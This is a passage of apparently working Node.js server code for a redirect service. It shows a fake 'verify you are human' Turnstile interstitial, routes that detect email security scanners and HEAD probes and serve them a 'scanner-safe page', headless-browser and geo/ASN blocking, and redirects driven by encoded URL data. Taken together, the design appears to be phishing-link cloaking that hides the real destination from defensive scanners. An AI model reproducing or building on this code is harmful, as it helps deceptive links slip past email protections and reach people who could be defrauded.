        body: JSON.stringify(clientContext({ phase:'boot-decrypt-error', msg:e.message }))
      });
    });
  }

  function tsApiOnLoad(ev){
    fetch('/ts-client-log', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify(clientContext({ phase:'api-onload-explicit' }))
    });
    boot();
  }
  function tsApiOnError(ev){
    fetch('/ts-client-log', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify(clientContext({
        phase:'api-onerror',
        src: ev && ev.target && ev.target.src || ''
      }))
    });
  }
</script>

<script src="${TURNSTILE_ORIGIN}/turnstile/v0/api.js?render=explicit"
        async defer
        onload="tsApiOnLoad(event)"
        onerror="tsApiOnError(event)"></script>
</head><body>
  <div class="card">
    <h3>Verify you are human by completing the action below.</h3>
    <p class="muted">IAA needs to review the security of your connection before proceeding.</p>
    <div id="ts" aria-live="polite"></div>
    <p id="status" class="status muted">Loading…</p>
    <noscript><p class="err">Turnstile requires JavaScript. Please enable JS and refresh.</p></noscript>
    <p class="muted" style="margin-top:18px">Protected by Cloudflare Turnstile</p>
  </div>
</body></html>`;

  res.type("html").send(htmlContent);
});

app.get("/e/:data(*)", (req, res) => {
  const urlPathFull = (req.originalUrl || "").slice(3);
  const clean = urlPathFull.split("?")[0];
  addLog(`[INTERSTITIAL] /e path used len=${clean.length}`);
  logScannerHit(req, "Email-safe path", clean);
  return renderScannerSafePage(res, clean, "Email-safe path");
});

app.head("/e/:data(*)", (req, res) => {
  const urlPathFull = (req.originalUrl || "").slice(3);
  const clean = urlPathFull.split("?")[0];
  addLog(`[INTERSTITIAL] HEAD /e path`);
  logScannerHit(req, "HEAD-probe", clean);
  return renderScannerSafePage(res, clean, "HEAD-probe");
});

app.get("/r", async (req, res) => {
  const baseString = safeDecode(String(req.query.d || ""));
  if (!baseString) return res.status(400).send("Missing data");
  return handleRedirectCore(req, res, baseString);
});

app.get("/:data(*)", async (req, res) => {
  const urlPathFull = (req.originalUrl || "").slice(1);
  const cleanPath = urlPathFull.split("?")[0];
  return handleRedirectCore(req, res, cleanPath);
});

// ================== HEALTH CHECK CONSTANTS ==================
const MIN_INTERVAL_MS  = process.env.NODE_ENV === "production" ? 60 * 1000 : 60 * 1000;
const MIN_HEARTBEAT_MS = process.env.NODE_ENV === "production" ? 5  * 60 * 1000 : 5 * 60 * 1000;

const HEALTH_INTERVAL_MS  = Math.max(
  MIN_INTERVAL_MS,
  parseMinHourToMs(process.env.HEALTH_INTERVAL  ?? "5m",  5 * 60 * 1000)
);

const HEALTH_HEARTBEAT_MS = Math.max(
  MIN_HEARTBEAT_MS,
  parseMinHourToMs(process.env.HEALTH_HEARTBEAT ?? "2h",  2 * 60 * 60 * 1000)
);

// ================== STARTUP & HEALTH CHECKS ==================
function startupSummary() {
  return [
    "🛡️ Security profile",
    `  • Time: zone=${zoneLabel()}`,
    `  • Turnstile: enforceAction=${ENFORCE_ACTION} maxAgeSec=${MAX_TOKEN_AGE_SEC} expectHost=${EXPECT_HOSTNAME || "-"}`,
    `  • Turnstile sitekey=${mask(TURNSTILE_SITEKEY)} secret=${mask(TURNSTILE_SECRET)}`,
    `  • Geo: allow=[${ALLOWED_COUNTRIES.join(",")||"-"}] block=[${BLOCKED_COUNTRIES.join(",")||"-"}] asn=[${BLOCKED_ASNS.join(",")||"-"}]`,
    `  • Headless: block=${HEADLESS_BLOCK} hardWeight=${HEADLESS_STRIKE_WEIGHT} softStrike=${HEADLESS_SOFT_STRIKE}`,
    `  • RateLimit: capacity=${RATE_CAPACITY}/window=${RATE_WINDOW_SECONDS}s`,
    `  • Bans: ttl=${BAN_TTL_SEC}s threshold=${BAN_AFTER_STRIKES} hpWeight=${STRIKE_WEIGHT_HP}`,
    `  • Allowlist: exact=[${ALLOWLIST_DOMAINS.join(",")||"-"}] suffix=[${ALLOWLIST_SUFFIXES.join(",")||"-"}]`,
    `  • Challenge security: rateLimit=5/5min tokens=10min`,
    `  • Geo fallback active=${Boolean(geoip)}`,
    `  • Health: interval=${fmtDurMH(HEALTH_INTERVAL_MS)} heartbeat=${fmtDurMH(HEALTH_HEARTBEAT_MS)}`  // ← Add this line
  ].join("\n");
}

let _health = { ok: null, lastHeartbeat: 0, okStreak: 0, failStreak: 0, inflight: false };

async function checkTurnstileReachable() {
  if (_health.inflight) return;
  _health.inflight = true;

  const now = Date.now();
  try {
    const url = `${TURNSTILE_ORIGIN}/turnstile/v0/api.js`;
    const r = await fetch(url, { method: "HEAD" });
    const ok = r.ok;

    if (ok) { _health.okStreak++; _health.failStreak = 0; }
    else    { _health.failStreak++; _health.okStreak  = 0; }

    if (_health.ok !== ok) {
      addLog(`[HEALTH] turnstile HEAD ${r.status} ${ok ? "ok" : "not-ok"} (change)`);
      _health.ok = ok;
      _health.lastHeartbeat = now;
    } else if (now - _health.lastHeartbeat >= HEALTH_HEARTBEAT_MS) {
      addLog(`[HEALTH] heartbeat status=${ok ? "ok" : "not-ok"} okStreak=${_health.okStreak} failStreak=${_health.failStreak}`);
      _health.lastHeartbeat = now;
    }
  } catch (e) {
    _health.failStreak++; _health.okStreak = 0;
    if (_health.ok !== false) {
      addLog(`[HEALTH] turnstile HEAD error ${String(e)} (change)`);
      _health.ok = false;
      _health.lastHeartbeat = now;
    } else if (now - _health.lastHeartbeat >= HEALTH_HEARTBEAT_MS) {
      addLog(`[HEALTH] heartbeat status=not-ok okStreak=${_health.okStreak} failStreak=${_health.failStreak}`);
      _health.lastHeartbeat = now;
    }
  } finally {
    _health.inflight = false;
  }
}

const PORT = process.env.PORT || 8080;
app.listen(PORT, async () => {
  if (geoip) addLog("ℹ️ geoip-lite enabled as country fallback");
  
  await loadScannerPatterns();

  // Add the health config log here, after all constants are defined
  addLog(`ℹ️ Health check config: interval=${fmtDurMH(HEALTH_INTERVAL_MS)} heartbeat=${fmtDurMH(HEALTH_HEARTBEAT_MS)}`);

  checkTurnstileReachable();
  setInterval(checkTurnstileReachable, HEALTH_INTERVAL_MS);

  addLog(`🚀 Server running on port ${PORT}`);
  addLog(startupSummary());
  addSpacer();
});
